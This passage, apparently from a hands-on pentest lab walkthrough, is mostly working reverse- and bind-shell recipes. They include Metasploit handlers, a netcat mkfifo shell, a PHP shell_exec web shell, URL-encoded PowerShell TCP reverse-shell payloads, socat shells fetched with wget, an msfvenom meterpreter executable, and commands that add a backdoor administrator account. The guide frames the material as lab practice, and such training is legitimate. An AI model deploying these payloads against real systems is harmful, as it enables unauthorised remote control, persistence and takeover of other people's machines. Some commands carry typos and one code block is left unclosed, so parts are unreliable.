An output similar to below will be obtained indicating the connection established to `msfconsole` terminal.
{% capture code %}{% raw %}(UNKNOWN) [<local-ip>] 443 (https) open{% endraw %}{% endcapture %} {%include code.html code=code %}

In the `msfconsole` terminal, bring the session to foreground for interaction. Use `python` to spawn `bash` shell. The session will be stabilised and sanitised by default by `msfconsole`.
{% capture code %}{% raw %}msf5 exploit(multi/handler) > [*] Command shell session 1 opened (<local-ip>:443 -> <target-ip>:45512) at 2021-04-13 11:13:18 +0100

msf5 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

python3 -c 'import pty; pty.spawn("/bin/bash")'
shell@linux-shell-practice:~$ ^C
Abort session 2? [y/N]  y

[*] <target-ip> - Command shell session 2 closed.  Reason: User exit
msf5 exploit(multi/handler) >{% endraw %}{% endcapture %} {%include code.html code=code %}


### Staged Meterpreter Shell - Linux

Use `msfconsole` to create `multi/handler` and load the payload `linux/x64/shell/reverse_tcp`, which is `staged`, and hence can evade firewalls and antivirus. The `exploit` is given in background, and hence sessions will not be loaded by default.
{% capture code %}{% raw %}msf5 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set LHOST <local-ip>
LHOST => <local-ip>
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > set PAYLOAD linux/x64/shell/reverse_tcp
PAYLOAD => linux/x64/shell/reverse_tcp
msf5 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on <local-ip>:443 {% endraw %}{% endcapture %} {%include code.html code=code %}

Activate the `reverse shell` from the attacker.
{% capture code %}{% raw %}mkfifo /tmp/f ; nc -nv <local-ip> 443 < /tmp/f | /bin/sh > /tmp/f 2>&1 ; rm -rf /tmp/f{% endraw %}{% endcapture %} {%include code.html code=code %}

An output similar to below will be obtained indicating the connection established to `msfconsole` terminal.
{% capture code %}{% raw %}(UNKNOWN) [<local-ip>] 443 (https) open{% endraw %}{% endcapture %} {%include code.html code=code %}

In the `msfconsole` terminal, bring the session to foreground for interaction. Use `python` to spawn `bash` shell. The session will be stabilised and sanitised by default by `msfconsole`.
{% capture code %}{% raw %}msf5 exploit(multi/handler) > [*] Sending stage (38 bytes) to <target-ip>
[*] Command shell session 1 opened (<local-ip>:443 -> <target-ip>:45518) at 2021-04-13 11:20:09 +0100

msf5 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

python3 -c 'import pty ; pty.spawn("/bin/bash")'
shell@linux-shell-practice:~$ ^C
Abort session 1? [y/N]  y

[*] <target-ip> - Command shell session 1 closed.  Reason: User exit
msf5 exploit(multi/handler) >{% endraw %}{% endcapture %} {%include code.html code=code %}


### Enumeration - Windows

Check the services running in the target.
{% capture code %}{% raw %}nmap -Pn -T4 -sS -F <ip>{% endraw %}{% endcapture %} {% include code.html code=code %}

An output similar to below will be obtained.
{% capture code %}{% raw %}Starting Nmap 7.60 ( https://nmap.org ) at 2021-04-13 13:34 BST
Nmap scan report for <hostname> (<target-ip>)
Host is up (0.0011s latency).
Not shown: 94 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
MAC Address: 02:B4:EB:52:EE:FD (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 3.14 seconds{% endraw %}{% endcapture %} {%include code.html code=code %}


### Web shell upload - Windows

Copy the webshell available in `/usr/share/webshells/php/php-reverse-shell.php` and edit the file to modify `ip` and `port` of attacking machine.
{% capture code %}{% raw %}$ip = '<local-ip>';
$port = 443;{% endraw %}{% endcapture %} {% include code.html code=code %}

Create a `netcat` listener in attacking machine.
{% capture code %}{% raw %}rlwrap nc -lnvp 443{% endraw %}{% endcapture %} {%include code.html code=code %}

An output similar to below will be obtained, which mentions the listener is active.
{% capture code %}{% raw %}Listening on [0.0.0.0] (family 0, port 443){% endraw %}{% endcapture %} {%include code.html code=code %}

Use `firefox` to login to the url `http://<ip>`, browse the `php-reverse-shell.php` payload and submit. Access the url `http://<ip>/uploads/php-reverse-shell.php` to activate the `reverse shell`.

The `reverse shell` would have spawned at the netcat listener.
{% capture code %}{% raw %}Connection from <target-ip> 49750 received!{% endraw %}{% endcapture %} {%include code.html code=code %}

However, the `php reverse shell` would not have activated, as this is not compatible with windows. The following error would occur in `firefox`.
{% capture code %}{% raw %}Notice: Undefined variable: daemon in C:\xampp\htdocs\uploads\php-reverse-shell.php on line 184
WARNING: Failed to daemonise. This is quite common and not fatal.
Notice: Undefined variable: daemon in C:\xampp\htdocs\uploads\php-reverse-shell.php on line 184
Successfully opened reverse shell to 10.10.255.254:443
Notice: Undefined variable: daemon in C:\xampp\htdocs\uploads\php-reverse-shell.php on line 184
ERROR: Shell process terminated {% endraw %}{% endcapture %} {%include code.html code=code %}

The following error would also appear in `netcat` listener shell.
{% capture code %}{% raw %}'uname' is not recognized as an internal or external command,
operable program or batch file.{% endraw %}{% endcapture %} {%include code.html code=code %}


### Web Shell - Windows

Create a `php web shell` payload.
{% capture code %}{% raw %}<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>{% endraw %}{% endcapture %} {%include code.html code=code %}

Create a `netcat` listener in attacking machine.
{% capture code %}{% raw %}rlwrap nc -lnvp 443{% endraw %}{% endcapture %} {%include code.html code=code %}

An output similar to below will be obtained, which mentions the listener is active.
{% capture code %}{% raw %}Listening on [0.0.0.0] (family 0, port 443){% endraw %}{% endcapture %} {%include code.html code=code %}

Use `firefox` to login to the url `http://<ip>`, browse the `shell.php` payload and submit. Access the url `http://<ip>/uploads/shell.php` along with the `powershell payload command` to activate the `reverse shell`.

Use any of the following payloads. The full url will use the `shell.php` payload along with `powershell payload command`.
{% capture code %}{% raw %}http://<target-ip>/uploads/shell.php?cmd=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient(%2710.10255.254%27%2C443)%3B%24stream%20%3D%20%24client.GetStream()%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile(%24i%20%3D%20%24stream.Read(%24bytes%2C%200%2C%20%24bytes.Length))%20-ne%200)%7B%3B%24data%20%3D%20(New-Object%20-TypeName%20System.TextASCIIEncoding).GetString(%24bytes%2C0%2C%20%24i)%3B%24sendback%20%3D%20(iex%20%24data%202%3E%261%20%7C%20Out-String%20%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20(pwd).Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20(%5Btextencoding%5D%3A%3AASCII).GetBytes(%24sendback2)%3B%24stream.Write(%24sendbyte%2C0%2C%24sendbyte.Length)%3B%24stream.Flush()%7D%3B%24clientClose()%22%0A

http://<target-ip>/uploads/shell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.255.254%27%2C443%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22{% endraw %}{% endcapture %} {%include code.html code=code %}

The `reverse shell` would have spawned at the netcat listener.
{% capture code %}{% raw %}Connection from <target-ip> 49819 received!

PS C:\xampp\htdocs\uploads> whoami
nt authority\system

PS C:\xampp\htdocs\uploads> net user tsran tsran123 /add
The command completed successfully.

PS C:\xampp\htdocs\uploads> net localgroup administrators tsran /add
The command completed successfully.{% endraw %}{% endcapture %} {%include code.html code=code %}

Use `xfreerdp` to test rdp connection with newly created user.
{% capture code %}{% raw %}xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:<target-ip> /u:tsran /p:'<password>'{% endraw %}{% endcapture %} {%include code.html code=code %}


### Reverse Netcat shell - Windows

Create a `netcat` listener in attacking machine.
{% capture code %}{% raw %}rlwrap nc -lnvp 443{% endraw %}{% endcapture %} {%include code.html code=code %}

An output similar to below will be obtained, which mentions the listener is active.
{% capture code %}{% raw %}Listening on [0.0.0.0] (family 0, port 443){% endraw %}{% endcapture %} {%include code.html code=code %}

Use `xfreerdp` to test rdp connection with newly created user.
{% capture code %}{% raw %}xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:<target-ip> /u:Administrator /p:'<password>'{% endraw %}{% endcapture %} {%include code.html code=code %}

Activate the `reverse shell` from the target.
{% capture code %}{% raw %}nc -nv 10.10.255.254 443 -e "cmd.exe"{% endraw %}{% endcapture %} {%include code.html code=code %}

An output similar to below will be obtained, indicating the connection established to `netcat` listener.
{% capture code %}{% raw %}(UNKNOWN) [10.10.255.254] 443 (?) open{% endraw %}{% endcapture %} {%include code.html code=code %}

The `reverse shell` in attacking machine would have spawned at the `netcat` listener.
{% capture code %}{% raw %}Connection from <target-ip> 50113 received!
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>{% endraw %}{% endcapture %} {%include code.html code=code %}


### Bind Netcat shell - Windows

Use `xfreerdp` to test rdp connection with newly created user.
{% capture code %}{% raw %}xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:<target-ip> /u:Administrator /p:'<password>'{% endraw %}{% endcapture %} {%include code.html code=code %}

Create a `netcat` listener in target machine.
{% capture code %}{% raw %}nc -lnvp 4430 -e "cmd.exe"{% endraw %}{% endcapture %} {%include code.html code=code %}

An output similar to below will be obtained, which mentions the listener is active.
{% capture code %}{% raw %}listening on [any] 4430 ...{% endraw %}{% endcapture %} {%include code.html code=code %}

Activate the `bind shell` from the attacking machine.
{% capture code %}{% raw %}nc -nv <target-ip> 4430

The `bind shell` in target machine would have spawned at the `netcat` activator.
{% capture code %}{% raw %}Connection to <target-ip> 4430 port [tcp/*] succeeded!
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>{% endraw %}{% endcapture %} {%include code.html code=code %}


### Reverse Socat shell - Windows

`Socat` can be installed from distribution repo or a standalone binary can be downloaded and used. The links for standalone binaries for linux is [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true){:target="_blank"} and windows is [here](https://sourceforge.net/projects/unix-utils/files/socat/){:target="_blank"}.

`Socat` shell is stabilised and sanitised by default and does not need additional configurations after gaining `shell`.

Create a `socat` listener in target machine.
{% capture code %}{% raw %}wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP-L:443 FILE:`tty`,raw,echo=0{% endraw %}{% endcapture %} {%include code.html code=code %}

Use `xfreerdp` to test rdp connection with newly created user.
{% capture code %}{% raw %}xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:<target-ip> /u:Administrator /p:'<password>'{% endraw %}{% endcapture %} {%include code.html code=code %}

Activate the `reverse shell` from the target machine.
{% capture code %}{% raw %}socat TCP:<target-ip>:443 EXEC:"cmd.exe",pty,stderr,sigint,setsid,sane{% endraw %}{% endcapture %} {%include code.html code=code %}

The `reverse shell` in attacking machine would have spawned at the `socat` listener.
{% capture code %}{% raw %}Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>{% endraw %}{% endcapture %} {%include code.html code=code %}


### Bind Socat shell - Windows

`Socat` can be installed from distribution repo or a standalone binary can be downloaded and used. The links for standalone binaries for linux is [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true){:target="_blank"} and windows is [here](https://sourceforge.net/projects/unix-utils/files/socat/){:target="_blank"}.

`Socat` shell is stabilised and sanitised by default and does not need additional configurations after gaining `shell`.

Use `xfreerdp` to test rdp connection with newly created user.
{% capture code %}{% raw %}xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:<target-ip> /u:Administrator /p:'<password>'{% endraw %}{% endcapture %} {%include code.html code=code %}

Create a `socat` listener in target machine.
{% capture code %}{% raw %}socat TCP-L:4430 EXEC:"powershell.exe",pipes{% endraw %}{% endcapture %} {%include code.html code=code %}

Activate the `bind shell` from the attacking machine.
{% capture code %}{% raw %}wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP:10.10.91.162:4430 FILE:`tty`,raw,echo=0{% endraw %}{% endcapture %} {%include code.html code=code %}

The `bind shell` in target machine would have spawned at the `socat` activator.
{% capture code %}{% raw %}Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\>{% endraw %}{% endcapture %} {%include code.html code=code %}


### Msfvenom meterpreter shell - Windows

Use `msfvenom` to create an `exe` payload.
{% capture code %}{% raw %}msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=<target-ip> LPORT=443{% endraw %}{% endcapture %} {%include code.html code=code %}

An output similar to below will be obtained.
{% capture code %}{% raw %}[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe{% endraw %}{% endcapture %} {%include code.html code=code %}

Use `msfconsole` to create `multi/handler` and load the payload `linux/x64/shell/reverse_tcp`, which is `staged`, and hence can evade firewalls and antivirus. The `exploit` is given in background, and hence sessions will not be loaded by default.
{% capture code %}{% raw %}msf5 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set LHOST <target-ip>
LHOST => <target-ip>
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 3.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on <target-ip>:443 {% endraw %}{% endcapture %} {%include code.html code=code %}

Copy `shell.exe` payload file and execute, which will activate the `reverse shell`

The payload would have activated a session in `msfconsole` teminal. Bring the session to foreground for interaction and gain `meterpreter` shell.
{% capture code %}{% raw %}msf5 exploit(multi/handler) > [*] Sending stage (201283 bytes) to 10.10.91.162
[*] Meterpreter session 1 opened (<target-ip>:443 -> 10.10.91.162:50140) at 2021-04-13 17:06:53 +0100

msf5 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

meterpreter >{% endraw %}{% endcapture %} {%include code.html code=code %}

